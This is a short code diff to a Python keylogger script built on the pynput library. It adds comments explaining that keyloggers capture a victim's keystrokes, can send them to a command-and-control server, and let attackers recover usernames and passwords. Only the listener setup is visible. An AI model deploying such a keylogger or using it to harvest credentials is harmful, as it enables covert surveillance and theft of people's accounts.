@@ -1,4 +1,4 @@
-
+#A keylogger program is malware that keeps track of a vicitim's keystrokes. Attackers can go a step further and record the strokes and have them sent using a command and control server. 
 #"pynput" is a library that allows you to monitor and listen to the events performed by the user via "keyboard".
 
 from pynput import keyboard
@@ -24,3 +24,5 @@ if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
     input()
+
+#After deploying the keylogger, an attacker can analyze the keystrokes to locate username and password information. This will allow the hacker to easily infiltrate an otherwise secure system.
